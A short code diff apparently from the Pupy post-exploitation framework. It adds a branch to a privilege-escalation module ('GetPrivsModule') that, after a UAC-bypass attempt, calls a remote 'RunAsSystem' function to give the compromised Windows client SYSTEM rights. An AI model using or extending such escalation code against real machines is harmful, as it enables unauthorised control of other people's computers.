@@ -93,3 +93,9 @@ class GetPrivsModule(PupyModule):
 
 			except:
 				self.error("Could not bypassuac")
+		else:
+			try:
+				self.client.conn.modules["pupwinutils.security"].RunAsSystem()
+				self.success("SYSTEM stuff enabled !")
+			except:
+				self.error("Could not run as SYSTEM...")
